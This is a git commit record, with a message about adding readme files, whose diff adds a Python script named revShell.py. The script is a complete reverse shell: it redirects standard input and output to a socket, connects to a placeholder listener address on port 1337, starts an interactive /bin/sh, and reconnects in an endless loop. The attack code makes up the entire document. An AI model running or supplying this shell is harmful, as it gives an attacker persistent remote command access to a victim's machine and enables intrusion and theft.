1bfd30518c2b963fdd3bed8ba9d93a5475a6230d
Mich21050 <m_wa@gmx.at>
2021-12-31 17:20:37 +0100

    added readme files

---
+++ revShell_resources/revShell.py
@@ -0,0 +1,16 @@
+#!/usr/bin/python
+import socket,subprocess,os
+host = "x.x.x.x" # Our remote listening server
+port = 1337
+while True:
+	try:
+		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		os.dup2(s.fileno(),0)
+		os.dup2(s.fileno(),1)
+		os.dup2(s.fileno(),2)
+		s.connect((host, port))
+		p=subprocess.call(["/bin/sh","-i"])
+		s.close()
+	except Exception as e:
+		s.close()
+		continue
